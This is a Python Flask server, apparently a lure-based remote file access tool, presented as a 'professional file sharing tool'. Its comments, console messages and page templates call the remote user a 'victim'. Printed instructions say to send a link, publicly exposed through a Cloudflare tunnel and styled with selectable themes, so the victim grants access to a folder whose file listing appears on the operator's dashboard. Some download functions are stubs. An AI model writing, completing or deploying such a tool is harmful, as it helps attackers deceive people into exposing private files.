#!/usr/bin/env python3
"""
WEB MANAGER - Professional File Sharing Tool
Run this on YOUR laptop only
"""

from flask import Flask, request, jsonify, send_file, render_template
from flask_cors import CORS
import os
import secrets
import threading
import time
import socket
import subprocess
import re
import shutil
import json
import platform
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
CORS(app, origins='*')

# ==================== CONFIGURATION ====================
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

connected_devices = {}
active_tokens = {}
device_counter = 0
cloudflared_url = None
cloudflared_process = None

# ==================== ROUTES ====================

@app.route('/')
def dashboard():
    """Controller dashboard"""
    return render_template('dashboard.html')

@app.route('/share/<token>')
def share_page(token):
    """Victim sharing page"""
    if token not in active_tokens:
        return "Invalid or expired link", 404
    
    # Get template parameter
    template = request.args.get('template', 'victim')
    
    if template == 'dark':
        return render_template('dark.html', token=token)
    elif template == 'modern':
        return render_template('modern.html', token=token)
    elif template == 'classic':
        return render_template('classic.html', token=token)
    else:
        return render_template('victim.html', token=token)

@app.route('/api/get_share_url')
def get_share_url():
    """Generate share URL"""
    token = secrets.token_urlsafe(32)
    active_tokens[token] = {
        'created': datetime.now(),
        'folder': None,
        'connected': False
    }
    
    global cloudflared_url
    if cloudflared_url:
        url = f"{cloudflared_url}/share/{token}"
    else:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = '127.0.0.1'
        url = f"http://{local_ip}:5000/share/{token}"
    
    return jsonify({'url': url, 'token': token})

@app.route('/api/set_folder', methods=['POST'])
def set_folder():
    """Receive selected folder from victim"""
    data = request.json
    token = data.get('token')
    folder_name = data.get('folderName')
    
    if token in active_tokens:
        active_tokens[token]['folder'] = folder_name
    
    return jsonify({'success': True})

@app.route('/api/grant_access', methods=['POST'])
def grant_access():
    """Victim grants access"""
    global device_counter
    data = request.json
    token = data.get('token')
    folder_name = data.get('folderName')
    
    if token not in active_tokens:
        return jsonify({'error': 'Invalid token'}), 400
    
    device_id = f"device_{device_counter}"
    device_counter += 1
    
    connected_devices[device_id] = {
        'id': device_id,
        'token': token,
        'name': f"Device_{device_counter}",
        'type': 'Browser',
        'folder': folder_name,
        'time': datetime.now().strftime('%H:%M:%S'),
        'files': [],
        'currentPath': '/'
    }
    
    active_tokens[token]['connected'] = True
    active_tokens[token]['device_id'] = device_id
    
    print(f"\n{'='*50}")
    print(f"✅ VICTIM CONNECTED!")
    print(f"📁 Sharing folder: {folder_name}")
    print(f"📱 Dashboard: http://localhost:5000")
    print(f"{'='*50}\n")
    
    return jsonify({'success': True, 'device_id': device_id})

@app.route('/api/send_file_list', methods=['POST'])
def send_file_list():
    """Receive file list from victim"""
    data = request.json
    token = data.get('token')
    path = data.get('path')
    files = data.get('files', [])
    
    # Find device by token
    for device_id, device in connected_devices.items():
        if device['token'] == token:
            device['files'] = files
            device['currentPath'] = path
            break
    
    return jsonify({'success': True})

@app.route('/api/revoke_access', methods=['POST'])
def revoke_access():
    """Revoke access"""
    data = request.json
    token = data.get('token')
    
    for device_id, device in list(connected_devices.items()):
        if device['token'] == token:
            del connected_devices[device_id]
            print(f"❌ Victim disconnected")
            break
    
    return jsonify({'success': True})

@app.route('/api/get_devices')
def get_devices():
    """Get all connected devices"""
    return jsonify({'devices': connected_devices})

@app.route('/api/get_files/<device_id>')
def get_files(device_id):
    """Get files from device"""
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404
    
    device = connected_devices[device_id]
    
    # Sample files - in real implementation, these come from victim
    sample_files = [
        {'name': 'Documents', 'path': '/Documents', 'is_dir': True, 'size': 0},
        {'name': 'Downloads', 'path': '/Downloads', 'is_dir': True, 'size': 0},
        {'name': 'Pictures', 'path': '/Pictures', 'is_dir': True, 'size': 0},
        {'name': 'Videos', 'path': '/Videos', 'is_dir': True, 'size': 0},
        {'name': 'Music', 'path': '/Music', 'is_dir': True, 'size': 0},
    ]
    
    return jsonify({
        'success': True,
        'files': sample_files,
        'current_path': device.get('currentPath', '/')
    })

@app.route('/api/download/<device_id>')
def download_file(device_id):
    """Download file"""
    # In real implementation, this would proxy to victim
    return jsonify({'error': 'File access requires victim to share files first'}), 404

@app.route('/api/remove_device/<device_id>', methods=['POST'])
def remove_device(device_id):
    """Remove device"""
    if device_id in connected_devices:
        del connected_devices[device_id]
    return jsonify({'success': True})

# ==================== CLOUDFLARED ====================

def start_cloudflared():
    global cloudflared_url, cloudflared_process
    
    def read_output():
        global cloudflared_url
        while cloudflared_process and cloudflared_process.stderr:
            line = cloudflared_process.stderr.readline()
            if line:
                match = re.search(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
                if match and not cloudflared_url:
                    cloudflared_url = match.group(0)
                    print(f"\n{'='*60}")
                    print(f"🌐 PUBLIC URL (Share with victim):")
                    print(f"   {cloudflared_url}")
                    print(f"   Template options: ?template=dark, ?template=modern, ?template=classic")
                    print(f"{'='*60}\n")
            time.sleep(0.1)
    
    try:
        print("🚀 Starting Cloudflared tunnel...")
        cloudflared_process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', 'http://localhost:5000'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        threading.Thread(target=read_output, daemon=True).start()
    except FileNotFoundError:
        print("\n⚠️ cloudflared not installed!")
        print("   Install: curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared")
        print("   Then: chmod +x cloudflared && sudo mv cloudflared /usr/local/bin/\n")

# ==================== MAIN ====================

if __name__ == '__main__':
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = '127.0.0.1'
    
    print(f"\n{'='*60}")
    print(f"🎮 WEB MANAGER - Professional Tool")
    print(f"{'='*60}")
    print(f"🌐 Dashboard: http://localhost:5000")
    print(f"🌐 Dashboard: http://{local_ip}:5000")
    print(f"{'='*60}")
    print(f"\n📋 HOW TO USE:")
    print(f"   1. Open dashboard: http://localhost:5000")
    print(f"   2. Copy the SHARE URL")
    print(f"   3. Send URL to victim")
    print(f"   4. Victim opens URL, selects a folder, clicks ALLOW")
    print(f"   5. Victim appears in your dashboard!")
    print(f"\n🎨 Template options for victim URL:")
    print(f"   ?template=dark     - Dark theme")
    print(f"   ?template=modern   - Modern theme")
    print(f"   ?template=classic  - Classic theme")
    print(f"{'='*60}\n")
    
    # Start cloudflared
    threading.Thread(target=start_cloudflared, daemon=True).start()
    time.sleep(2)
    
    app.run(host='0.0.0.0', port=5000, debug=False)